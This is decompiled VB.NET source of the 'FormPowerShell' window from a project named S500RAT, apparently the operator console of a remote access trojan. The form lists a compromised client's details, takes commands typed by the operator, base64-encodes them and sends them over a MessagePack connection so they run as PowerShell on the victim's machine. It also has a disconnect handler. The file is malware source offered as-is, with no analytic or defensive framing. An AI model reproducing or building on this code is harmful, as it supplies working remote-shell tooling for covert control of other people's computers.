Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000026 RID: 38
	<DesignerGenerated()>
	Public Partial Class FormPowerShell
		Inherits Form

		' Token: 0x170002BC RID: 700
		' (get) Token: 0x060006C9 RID: 1737 RVA: 0x0003A0BF File Offset: 0x000382BF
		' (set) Token: 0x060006CA RID: 1738 RVA: 0x0003A0CC File Offset: 0x000382CC
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170002BD RID: 701
		' (get) Token: 0x060006CB RID: 1739 RVA: 0x0003A10F File Offset: 0x0003830F
		' (set) Token: 0x060006CC RID: 1740 RVA: 0x0003A119 File Offset: 0x00038319
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x170002BE RID: 702
		' (get) Token: 0x060006CD RID: 1741 RVA: 0x0003A122 File Offset: 0x00038322
		' (set) Token: 0x060006CE RID: 1742 RVA: 0x0003A12C File Offset: 0x0003832C
		Private Overridable Property ClientInfo As Label

		' Token: 0x170002BF RID: 703
		' (get) Token: 0x060006CF RID: 1743 RVA: 0x0003A135 File Offset: 0x00038335
		' (set) Token: 0x060006D0 RID: 1744 RVA: 0x0003A13F File Offset: 0x0003833F
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x170002C0 RID: 704
		' (get) Token: 0x060006D1 RID: 1745 RVA: 0x0003A148 File Offset: 0x00038348
		' (set) Token: 0x060006D2 RID: 1746 RVA: 0x0003A154 File Offset: 0x00038354
		Public Overridable Property T2 As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._T2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As EventHandler = AddressOf Me.T2_TextChanged
				Dim value3 As KeyEventHandler = AddressOf Me.T2_KeyDown
				Dim t As Guna2TextBox = Me._T2
				If t IsNot Nothing Then
					RemoveHandler t.TextChanged, value2
					RemoveHandler t.KeyDown, value3
				End If
				Me._T2 = value
				t = Me._T2
				If t IsNot Nothing Then
					AddHandler t.TextChanged, value2
					AddHandler t.KeyDown, value3
				End If
			End Set
		End Property

		' Token: 0x170002C1 RID: 705
		' (get) Token: 0x060006D3 RID: 1747 RVA: 0x0003A1B2 File Offset: 0x000383B2
		' (set) Token: 0x060006D4 RID: 1748 RVA: 0x0003A1BC File Offset: 0x000383BC
		Public Overridable Property T1 As UIRichTextBox

		' Token: 0x170002C2 RID: 706
		' (get) Token: 0x060006D5 RID: 1749 RVA: 0x0003A1C5 File Offset: 0x000383C5
		' (set) Token: 0x060006D6 RID: 1750 RVA: 0x0003A1CF File Offset: 0x000383CF
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x170002C3 RID: 707
		' (get) Token: 0x060006D7 RID: 1751 RVA: 0x0003A1D8 File Offset: 0x000383D8
		' (set) Token: 0x060006D8 RID: 1752 RVA: 0x0003A1E2 File Offset: 0x000383E2
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x170002C4 RID: 708
		' (get) Token: 0x060006D9 RID: 1753 RVA: 0x0003A1EB File Offset: 0x000383EB
		' (set) Token: 0x060006DA RID: 1754 RVA: 0x0003A1F8 File Offset: 0x000383F8
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170002C5 RID: 709
		' (get) Token: 0x060006DB RID: 1755 RVA: 0x0003A23B File Offset: 0x0003843B
		' (set) Token: 0x060006DC RID: 1756 RVA: 0x0003A245 File Offset: 0x00038445
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x170002C6 RID: 710
		' (get) Token: 0x060006DD RID: 1757 RVA: 0x0003A24E File Offset: 0x0003844E
		' (set) Token: 0x060006DE RID: 1758 RVA: 0x0003A258 File Offset: 0x00038458
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x170002C7 RID: 711
		' (get) Token: 0x060006DF RID: 1759 RVA: 0x0003A261 File Offset: 0x00038461
		' (set) Token: 0x060006E0 RID: 1760 RVA: 0x0003A26B File Offset: 0x0003846B
		Public Property Client As Clients

		' Token: 0x170002C8 RID: 712
		' (get) Token: 0x060006E1 RID: 1761 RVA: 0x0003A274 File Offset: 0x00038474
		' (set) Token: 0x060006E2 RID: 1762 RVA: 0x0003A27E File Offset: 0x0003847E
		Public Property F As FormS500

		' Token: 0x170002C9 RID: 713
		' (get) Token: 0x060006E3 RID: 1763 RVA: 0x0003A287 File Offset: 0x00038487
		' (set) Token: 0x060006E4 RID: 1764 RVA: 0x0003A291 File Offset: 0x00038491
		Public Property FullPath As String

		' Token: 0x170002CA RID: 714
		' (get) Token: 0x060006E5 RID: 1765 RVA: 0x0003A29A File Offset: 0x0003849A
		' (set) Token: 0x060006E6 RID: 1766 RVA: 0x0003A2A4 File Offset: 0x000384A4
		Friend Property ParentClient As Clients

		' Token: 0x060006E7 RID: 1767 RVA: 0x0003A2B0 File Offset: 0x000384B0
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormPowerShell_Load
			AddHandler MyBase.Resize, AddressOf Me.FormCMD_Resize
			Me.FormSize = False
			Me.string_1 = New String(4) {}
			Me.int_0 = 0
			Me.int_1 = 0
			Me.InitializeComponent()
		End Sub

		' Token: 0x060006E8 RID: 1768 RVA: 0x0003A314 File Offset: 0x00038514
		Private Sub FormPowerShell_Load(sender As Object, e As EventArgs)
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
		End Sub

		' Token: 0x060006E9 RID: 1769 RVA: 0x0003A3FC File Offset: 0x000385FC
		Private Sub FormCMD_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x060006EA RID: 1770 RVA: 0x0003A490 File Offset: 0x00038690
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x060006EB RID: 1771 RVA: 0x0003A4FC File Offset: 0x000386FC
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "Disconnect"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Thread.Sleep(1)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x060006EC RID: 1772 RVA: 0x0003A511 File Offset: 0x00038711
		Private Sub T2_TextChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060006ED RID: 1773 RVA: 0x0003A514 File Offset: 0x00038714
		Private Sub T2_KeyDown(sender As Object, e As KeyEventArgs)
			Dim keyCode As Keys = e.KeyCode
			If keyCode <> Keys.[Return] Then
				If keyCode <> Keys.Up Then
					If keyCode = Keys.Down Then
						Dim ptr As Integer = Me.int_0
						Me.int_0 = ptr + -1
						Dim flag As Boolean = Me.int_0 < 0
						If flag Then
							Me.int_0 = 0
						End If
						Me.T2.Text = Me.string_1(Me.int_0)
					End If
				Else
					Dim ptr As Integer = Me.int_0
					Me.int_0 = ptr + 1
					Dim flag2 As Boolean = Me.int_0 > Me.string_1.Length - 1
					If flag2 Then
						Me.int_0 = Me.string_1.Length - 1
					End If
					Me.T2.Text = Me.string_1(Me.int_0)
				End If
			Else
				Dim text As String = Me.T2.Text
				Me.T2.Text = String.Empty
				e.SuppressKeyPress = True
				Me.string_1(Me.int_1) = text
				Dim ptr As Integer = Me.int_1
				Me.int_1 = ptr + 1
				Dim flag3 As Boolean = Me.int_1 > Me.string_1.Length - 1
				If flag3 Then
					Me.int_1 = 0
				End If
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "Write"
				msgPack.ForcePathObject("Code").AsString = Functions.StringToBase64(text)
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			End If
		End Sub

		' Token: 0x04000320 RID: 800
		Private FormSize As Boolean

		' Token: 0x04000321 RID: 801
		Private int_0 As Integer

		' Token: 0x04000322 RID: 802
		Private int_1 As Integer

		' Token: 0x04000323 RID: 803
		Private string_1 As String()

		' Token: 0x04000324 RID: 804
		Private idx As Integer

		' Token: 0x04000325 RID: 805
		Private it As Integer
	End Class
End Namespace
